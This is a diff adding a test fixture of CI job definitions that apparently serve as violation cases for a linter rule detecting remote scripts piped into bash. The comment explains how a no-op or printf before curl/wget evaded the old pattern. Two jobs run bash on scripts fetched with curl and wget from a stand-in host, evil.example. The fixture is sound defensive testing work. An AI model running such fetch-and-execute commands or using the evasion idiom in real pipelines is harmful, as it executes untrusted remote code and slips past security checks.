@@ -1,0 +1,15 @@
+# violation: the fetch may be preceded by other commands inside the
+# command substitution, a hardened-install idiom (`set -e`/a no-op/a
+# throwaway printf before the real curl). The old anchor required
+# curl/wget to be the first token right after `$(`, so these evaded
+# ISSUE-411 entirely even though bash -c runs the whole substitution's
+# output, fetch and all.
+printf_prefix:
+  image: alpine:3.19
+  script:
+    - bash -c "$(printf ''; curl -fsSL https://evil.example/x.sh)"
+
+colon_prefix:
+  image: alpine:3.19
+  script:
+    - bash -c "$(:; wget -qO- https://evil.example/y.sh)"
